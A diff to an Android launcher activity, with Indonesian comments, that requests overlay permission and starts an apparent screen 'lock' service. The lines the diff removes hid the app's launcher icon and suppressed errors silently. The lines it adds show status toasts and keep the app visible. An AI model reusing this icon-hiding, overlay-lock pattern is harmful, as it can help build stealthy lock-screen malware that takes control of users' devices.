@@ -6,21 +6,16 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.widget.Toast;
 
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
 
-        try {
-            getPackageManager().setComponentEnabledSetting(
-                getComponentName(),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            );
-        } catch (Exception ignored) {}
-
+        // Cek izin overlay
         if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
+            Toast.makeText(this, "Izinkan overlay dulu", Toast.LENGTH_LONG).show();
             try {
                 Intent i = new Intent(
                     Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -31,7 +26,9 @@ public class MainActivity extends Activity {
                 try {
                     Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                     startActivityForResult(i, 100);
-                } catch (Exception ignored) {}
+                } catch (Exception e2) {
+                    Toast.makeText(this, "Error: " + e2.getMessage(), Toast.LENGTH_LONG).show();
+                }
             }
         } else {
             startLock();
@@ -41,14 +38,11 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int req, int res, Intent d) {
         super.onActivityResult(req, res, d);
-        startLock();
-    }
-
-    @Override
-    protected void onResume() {
-        super.onResume();
         if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this)) {
             startLock();
+        } else {
+            Toast.makeText(this, "Izin overlay belum di-allow", Toast.LENGTH_LONG).show();
+            finish();
         }
     }
 
@@ -60,7 +54,11 @@ public class MainActivity extends Activity {
             } else {
                 startService(svc);
             }
-        } catch (Exception ignored) {}
-        finish();
+            Toast.makeText(this, "Lock aktif!", Toast.LENGTH_SHORT).show();
+            // JANGAN finish() — biar user liat app-nya
+            // finish();
+        } catch (Exception e) {
+            Toast.makeText(this, "Error start: " + e.getMessage(), Toast.LENGTH_LONG).show();
+        }
     }
 }
